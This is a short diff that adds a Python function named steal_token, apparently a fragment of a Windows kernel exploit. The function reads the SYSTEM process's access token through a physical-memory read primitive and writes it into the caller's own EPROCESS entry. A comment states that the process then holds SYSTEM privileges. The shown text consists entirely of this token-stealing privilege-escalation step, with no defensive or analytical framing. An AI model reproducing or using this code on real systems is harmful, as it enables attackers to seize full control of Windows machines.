@@ -1,0 +1,10 @@
+def steal_token(phys_memory, system_eprocess, our_eprocess):
+    """Copies the SYSTEM token to our process."""
+    system_token = phys_memory.read_qword(
+        system_eprocess + OFFSET_TOKEN
+    )
+    phys_memory.write_qword(
+        our_eprocess + OFFSET_TOKEN,
+        system_token
+    )
+    # After this, our process has the SYSTEM token
